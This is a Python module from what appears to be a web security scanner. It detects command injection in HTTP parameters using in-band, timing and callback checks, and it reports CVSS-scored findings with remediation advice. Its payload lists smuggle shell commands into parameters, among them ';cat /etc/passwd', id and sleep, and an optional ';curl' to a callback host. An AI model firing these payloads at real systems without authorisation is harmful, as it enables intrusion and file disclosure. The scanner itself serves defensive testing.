"""
Command Injection Detector — in-band, time-based, and out-of-band.

Signals:
- OS command output leaks (root:x:, drwx, Volume Serial)
- Time-based confirmation via statistical baseline (sleep N)
- Callback-based OOB (only if CALLBACK_URL env set)
"""
import os
import re
import time
from typing import List

from .base_detector import BaseDetector, DetectorResult
from ..models.test_state import TestState
from ..models.finding import StandardFinding, CVSSInfo
from ..models.evidence import Evidence, RequestEvidence, ResponseEvidence, safe_body_snippet
from ..models.confidence import ConfidenceResult, ConfidenceLevel


CMD_HINT_PARAMS = {
    "cmd", "command", "exec", "execute", "run", "ping", "traceroute",
    "nslookup", "dig", "host", "system", "shell", "bash",
    "wget", "curl", "download", "hostname", "ip", "domain", "target",
}

INBAND_PAYLOADS = [
    (";echo GHZ_$(id -u)_GHZ", re.compile(r"GHZ_\d+_GHZ")),
    ("|echo GHZ_$(id -u)_GHZ", re.compile(r"GHZ_\d+_GHZ")),
    ("`echo GHZ_MARK_GHZ`", re.compile(r"GHZ_MARK_GHZ")),
    ("$(echo GHZ_MARK_GHZ)", re.compile(r"GHZ_MARK_GHZ")),
    (";cat /etc/passwd", re.compile(r"root:x:0:0")),
    ("|cat /etc/passwd", re.compile(r"root:x:0:0")),
    (";type C:\\Windows\\win.ini", re.compile(r"\[extensions\]", re.I)),
]

TIME_PAYLOADS = [
    ";sleep 5",
    "|sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "&& ping -c 5 127.0.0.1",
    "& timeout /t 5",
]


class CommandInjectionDetector(BaseDetector):
    name = "Command Injection"
    category = "Injection"
    cwe = "CWE-78"
    owasp = "A03:2021 - Injection"

    def _run(self, endpoints, engine, auth_context, baseline_measurer):
        callback = os.getenv("CALLBACK_URL", "").strip()

        testable = []
        for ep in endpoints:
            if not ep.all_params:
                continue
            hinted = [p for p in ep.all_params if p.lower() in CMD_HINT_PARAMS]
            if hinted or "/api/" in ep.url.lower() or "/cgi-bin/" in ep.url.lower():
                testable.append((ep, hinted or ep.all_params[:3]))

        if not testable:
            return DetectorResult(
                test_state=TestState.NOT_APPLICABLE,
                details="No command-oriented parameters found",
            )

        findings: List[StandardFinding] = []
        tested = 0
        blocked = 0

        for ep, params in testable[:15]:
            tested += 1
            for param in params[:3]:
                ep_signals: List[str] = []
                proof_body = ""

                # In-band
                for payload, marker in INBAND_PAYLOADS:
                    data = {p: ("benign123" if p != param else "127.0.0.1" + payload) for p in ep.all_params}
                    resp = (engine.post(ep.url, json=data) if ep.method == "POST"
                            else engine.get(ep.url, params=data))
                    if resp.is_blocked:
                        blocked += 1
                        continue
                    if not resp.has_response:
                        continue
                    if marker.search(resp.body or ""):
                        ep_signals.append(
                            f"error_based_confirmed: marker matched via param={param} payload={payload[:30]}"
                        )
                        proof_body = resp.body[:500]
                        break

                # Time-based
                if not ep_signals:
                    baseline = baseline_measurer.get_baseline(engine, ep.url, ep.method)
                    for payload in TIME_PAYLOADS[:3]:
                        data = {p: ("benign123" if p != param else "127.0.0.1" + payload) for p in ep.all_params}
                        resp = (engine.post(ep.url, json=data, timeout=12) if ep.method == "POST"
                                else engine.get(ep.url, params=data, timeout=12))
                        if resp.is_blocked:
                            blocked += 1
                            continue
                        if resp.is_timeout or (resp.has_response and baseline.is_time_anomalous(resp.elapsed, threshold_factor=3.0) and resp.elapsed >= 4.0):
                            ep_signals.append(
                                f"timing_statistical: elapsed={resp.elapsed:.1f}s baseline_median={baseline.median_time:.2f}s payload={payload}"
                            )
                            break

                # OOB
                if callback and not ep_signals:
                    oob_payload = f";curl {callback}/{ep.url.rsplit('/', 1)[-1] or 'root'}"
                    data = {p: ("benign123" if p != param else oob_payload) for p in ep.all_params}
                    resp = (engine.post(ep.url, json=data) if ep.method == "POST"
                            else engine.get(ep.url, params=data))
                    if resp.has_response and not resp.is_blocked:
                        ep_signals.append(f"oob_payload_sent: check {callback} for interaction from param={param}")

                if not ep_signals:
                    continue

                confidence = ConfidenceResult.from_signals(ep_signals)
                if confidence.level in (ConfidenceLevel.MEDIUM, ConfidenceLevel.HIGH, ConfidenceLevel.CONFIRMED):
                    findings.append(StandardFinding(
                        vulnerability="Command Injection",
                        title="Command Injection",
                        category=self.category,
                        severity="CRITICAL" if confidence.level == ConfidenceLevel.CONFIRMED else "HIGH",
                        confidence=confidence,
                        status=TestState.VULNERABLE,
                        endpoint=ep.url,
                        method=ep.method,
                        parameter=param,
                        cvss=CVSSInfo(score=9.8, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", severity="CRITICAL"),
                        owasp=self.owasp, cwe=self.cwe,
                        remediation="Never pass user input to a shell. Use safe APIs (subprocess with argv list, no shell=True), strict allow-lists, and drop dangerous chars.",
                        description="The parameter is passed to an operating-system command interpreter. An attacker can execute arbitrary commands with the privileges of the web process.",
                        evidence=[
                            Evidence(
                                description=s,
                                response=ResponseEvidence(body_snippet=safe_body_snippet(proof_body)) if proof_body else None,
                            )
                            for s in ep_signals
                        ],
                    ))

        state = (TestState.VULNERABLE if findings
                 else TestState.BLOCKED if blocked >= tested and tested > 0
                 else TestState.PASS if tested > 0
                 else TestState.NOT_APPLICABLE)
        return DetectorResult(
            test_state=state,
            findings=findings,
            details=f"Tested {tested} endpoints. {len(findings)} vulnerable, {blocked} blocked.",
            endpoints_tested=tested,
            endpoints_blocked=blocked,
        )
